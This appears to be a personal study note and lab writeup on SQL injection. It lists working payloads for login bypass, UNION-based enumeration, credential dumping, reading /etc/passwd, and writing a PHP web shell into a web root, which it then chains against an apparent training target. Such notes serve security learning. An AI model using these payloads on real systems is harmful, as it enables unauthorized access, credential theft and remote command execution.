![image](https://hackmd.io/_uploads/BkVt0XDmC.png)

## <span style=color:black>Auth Bypass with OR operator</span>
```sql!
tom' OR '1' = '1
```
```sql!
SELECT * FROM logins WHERE username = 'tom' OR '1' = '1' AND password = 'ANYPASSWORD';
```
## <span style=color:black>Auth Bypass with comments</span>
```sql!
123' OR id=5)-- -
```
```sql!
SELECT * FROM logins WHERE (username = '123' OR id=5)-- -' AND id>1) AND password = '202cb962ac59075b964b07152d234b70';
```
# <span style=color:red>Union Un-even Columns</span>
```sql!
MariaDB [employees]> DESCRIBE departments;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| dept_no   | char(4)     | NO   | PRI | NULL    |       |
| dept_name | varchar(40) | NO   | UNI | NULL    |       |
+-----------+-------------+------+-----+---------+-------+

MariaDB [employees]> DESCRIBE employees;
+------------+---------------+------+-----+---------+-------+
| Field      | Type          | Null | Key | Default | Extra |
+------------+---------------+------+-----+---------+-------+
| emp_no     | int(11)       | NO   | PRI | NULL    |       |
| birth_date | date          | NO   |     | NULL    |       |
| first_name | varchar(14)   | NO   |     | NULL    |       |
| last_name  | varchar(16)   | NO   |     | NULL    |       |
| gender     | enum('M','F') | NO   |     | NULL    |       |
| hire_date  | date          | NO   |     | NULL    |       |
+------------+---------------+------+-----+---------+-------+

MariaDB [employees]> SELECT dept_no, dept_name, NULL, NULL, NULL, NULL FROM departments UNION SELECT * FROM employees LIMIT 15;
+---------+--------------------+---------+-------------+------+------------+
| dept_no | dept_name          | NULL    | NULL        | NULL | NULL       |
+---------+--------------------+---------+-------------+------+------------+
| d009    | Customer Service   | NULL    | NULL        | NULL | NULL       |
| d005    | Development        | NULL    | NULL        | NULL | NULL       |
| d002    | Finance            | NULL    | NULL        | NULL | NULL       |
| d003    | Human Resources    | NULL    | NULL        | NULL | NULL       |
| d001    | Marketing          | NULL    | NULL        | NULL | NULL       |
| d004    | Production         | NULL    | NULL        | NULL | NULL       |
| d006    | Quality Management | NULL    | NULL        | NULL | NULL       |
| d008    | Research           | NULL    | NULL        | NULL | NULL       |
| d007    | Sales              | NULL    | NULL        | NULL | NULL       |
| 10001   | 1953-09-02         | Georgi  | Facello     | M    | 1986-06-26 |
| 10002   | 1952-12-03         | Vivian  | Billawala   | F    | 1986-12-11 |
| 10003   | 1959-06-16         | Temple  | Lukaszewicz | M    | 1992-07-04 |
| 10004   | 1956-11-06         | Masanao | Rahimi      | M    | 1986-12-16 |
| 10005   | 1962-12-11         | Sanjay  | Danlos      | M    | 1985-08-01 |
| 10006   | 1963-12-30         | Marie   | Stafford    | M    | 1988-10-10 |
+---------+--------------------+---------+-------------+------+------------+
```
# <font color=red>Union Injection</font>
* order to enum column
    * ' order by 1-- -, ' order by 2-- -, ' order by 3-- -...
    * until Error: Unknown column
```sql
SELECT * FROM users WHERE username = 'admin' ORDER BY 1-- -
SELECT * FROM users WHERE username = 'admin' ORDER BY 2-- -
SELECT * FROM users WHERE username = 'admin' ORDER BY 3-- -
```
* try to union injection
```sql!
cn' UNION select 1,2,3,4-- -
```

```sql!
cn' UNION select 1,user(),3,4-- -
```


## Database Enumeration
```sql!
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```
- The first three databases are default MySQL databases and are present on any server, so we usually ignore them during DB enumeration. Sometimes there's a fourth 'sys' DB as well.

# <font color=blue>MySQL Fingerprinting</font>
## INFORMATION_SCHEMA Database
1. List of databases
2. List of tables within each database
3. List of columns within each table

## SCHEMATA
```sql!
mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| ilfreight          |
| dev                |
+--------------------+
6 rows in set (0.01 sec)
```

---
```sql!
cn' UNION select 1,database(),2,3-- -
```
![](https://hackmd.io/_uploads/ryq6hYx6h.png)
---

## SCHEMATA.TABLES
The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to.
```sql!
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```
![](https://hackmd.io/_uploads/H1UlIte6n.png)
---

## SCHEMATA.COLUMNS
The COLUMNS table contains information about all columns present in all the databases.
```sql!
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
![](https://hackmd.io/_uploads/Hy0VIKxp3.png)
---

## DATA GET!
```sql!
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
![](https://hackmd.io/_uploads/ByUBouZ6h.png)
---

# <font color=red>Privilege</font>
## USER_PRIVILEGES
```sql!
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

# <font color=red>Reading_files</font>
```sql!
SELECT LOAD_FILE('/etc/passwd');
```
![](https://hackmd.io/_uploads/ry9Lu1Gph.png)

## Write_files
```sql!
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
[Web root dir in Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)

[Web root dir in Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)


## file written successfully!
```sql!
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

### web shell
```shell！
<?php system($_REQUEST[0]); ?>
```

## Union Injection Payload
```sql!
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

---
## Writeup
First, I try the auth bypass with OR operator 
```sql!
' OR 1=1-- -

'UNION SELECT 1,DATABASE(),2,3,4-- -

' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4,5 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='ilfreight'-- -

' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,5 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'-- -

' UNION SELECT 1,username,password,4,5 FROM ilfreight.users-- 
```
---
```sql!
' UNION SELECT 1,super_priv,3,4,5 FROM mysql.user WHERE user="root"-- -

' UNION SELECT 1, variable_name, variable_value, 4,5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

' UNION SELECT 1,'file written successfully!',3,4,5 into outfile '/var/www/html/dashboard/proof.txt'-- - 

' UNION SELECT 1,'<?php system($_REQUEST[0]); ?>',3,4,5 into outfile '/var/www/html/dashboard/shell.php'-- -
```

![](https://hackmd.io/_uploads/rJuNVXQp2.png)


